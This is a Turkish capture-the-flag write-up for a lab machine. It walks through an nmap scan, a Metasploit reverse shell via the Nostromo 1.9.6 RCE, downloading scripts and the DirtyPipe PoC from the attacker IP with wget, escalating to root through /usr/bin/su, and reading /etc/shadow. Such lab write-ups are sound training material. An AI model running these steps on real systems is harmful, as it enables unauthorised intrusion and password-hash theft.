# Glitch CTF Write-Up

## Makine Bilgileri
* **Hedef IP / Hostname:** `172.20.6.54` / `goldnertech.hv`
* **Saldırgan IP (LHOST):** `10.8.136.22`
* **İşletim Sistemi:** Linux Debian (Kernel `5.11.0-051100-generic`)
* **Tespit Edilen Zafiyetler:** 
  * Nostromo 1.9.6 Remote Code Execution (CVE-2019-16278)
  * DirtyPipe Privilege Escalation (CVE-2022-0847)

---

## 1. Keşif ve Ağ Taraması (Reconnaissance)

İlk olarak hedef makinenin ağ üzerinde aktif olup olmadığını doğrulamak amacıyla ICMP ping testi gerçekleştirilmiştir.

```bash
ping goldnertech.hv
```

![Ping Testi](1.png)

Makinenin erişilebilir durumda olduğu doğrulandıktan sonra, üzerindeki açık portları ve çalışan servis versiyonlarını tespit etmek amacıyla Nmap ile kapsamlı bir servis taraması yapılmıştır.

```bash
nmap -sC -sV -T4 172.20.6.54
```

![Nmap Taraması](2.png)

**Nmap Taraması Sonuçları:**
* **Port 22/tcp:** OpenSSH 8.4p1 Debian
* **Port 80/tcp:** Nostromo 1.9.6 HTTP Web Sunucusu

---

## 2. İlk Erişim (Initial Access)

Port 80 üzerinde çalışan **Nostromo 1.9.6** servisinin bilinen Uzaktan Kod Çalıştırma (RCE) zafiyetlerini araştırmak için `msfconsole` başlatılmış ve arama yapılmıştır.

```bash
msfconsole
msf > search nostromo 1.9.6
```

![Metasploit Zafiyet Taraması](3.png)

Arama sonucunda `exploit/multi/http/nostromo_code_exec` modülü tespit edilmiştir. Modül seçilerek hedef IP (`rhosts`) ve kendi IP adresimiz (`lhost`) konfigüre edilmiştir.

```bash
use exploit/multi/http/nostromo_code_exec
set rhosts 172.20.6.54
set lhost 10.8.136.22
```

![Metasploit Ayarları](4.png)

Exploit tetiklenerek hedef sistem üzerinde `www-data` kullanıcısı yetkileriyle bir reverse shell oturumu elde edilmiştir.

```bash
exploit -j -z
```

![Shell Elde Edilmesi](5.png)

---

## 3. Sistem İçi Keşif (Local Enumeration)

Yetki yükseltme (Privilege Escalation) vektörlerini belirlemek adına öncelikle hedef sistemin Linux çekirdek (Kernel) sürümü kontrol edilmiştir.

```bash
uname -a
```

![Uname Kontrolü](6.png)

Sistemin `Linux debian 5.11.0-051100-generic` çekirdek sürümünü kullandığı görülmüştür. Olası yetki yükseltme açıklarını otomatik analiz etmek için `linux-exploit-suggester.sh` betiği hedef makineye aktarılmış ve çalıştırılmıştır.

```bash
cd /tmp
wget http://10.8.136.22/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

![Linux Exploit Suggester Çalıştırılması](7.jpg)

Betiğin çıktıları incelendiğinde, mevcut Kernel sürümünün **CVE-2022-0847 (DirtyPipe)** zafiyetine karşı duyarlı olduğu tespit edilmiştir.

![DirtyPipe Zafiyet Tespiti](8.png)

---

## 4. Yetki Yükseltme (Privilege Escalation)

DirtyPipe zafiyeti, SUID yetkisine sahip binary'leri geçici olarak manipüle ederek root kabuğu (shell) elde etmeye olanak tanır. PoC kodunun (`dirtypipez.c`) çalışma mantığı incelenmiştir.

![DirtyPipe PoC Kod Analizi](9.png)

Exploit kaynak kodu saldırgan makinesinden hedef sistemin `/tmp` dizinine indirilmiş ve GCC derleyicisi kullanılarak derlenmiştir.

```bash
cd /tmp
wget http://10.8.136.22/dirtypipez.c
gcc dirtypipez.c -o dirtypipez
```

![Exploit İndirme ve Derleme](10.png)

Derlenen zararlı binary, SUID yetkisine sahip `/usr/bin/su` dosyası hedef gösterilerek çalıştırılmıştır. Exploit SUID binary'sini manipüle edip root yetkilerine sahip kabuğu açmış ve ardından binary'yi orijinal haline geri döndürmüştür.

```bash
./dirtypipez /usr/bin/su
```

![Root Shell Elde Etme](11.png)

`#` yetkisi alındıktan sonra root dizinine geçiş yapılmış ve hassas sistem dosyalarından biri olan `/etc/shadow` okunarak root yetkisi tamamen doğrulanmıştır.

```bash
cd /root
cat /etc/shadow
```

![Root Yetkisi Doğrulama](/etc/shadow)

---

## 5. Özet ve Sonuç
1. **Nmap** ile Nostromo 1.9.6 web sunucusu tespit edildi.
2. **Metasploit** kullanılarak `nostromo_code_exec` zafiyeti üzerinden `www-data` kullanıcısıyla sisteme sızıldı.
3. **Linux Exploit Suggester** ile Kernel 5.11 üzerinde **DirtyPipe (CVE-2022-0847)** açığı belirlendi.
4. `dirtypipez.c` PoC derlenerek `/usr/bin/su` üzerinden yetki yükseltildi ve **Root** erişimi sağlandı.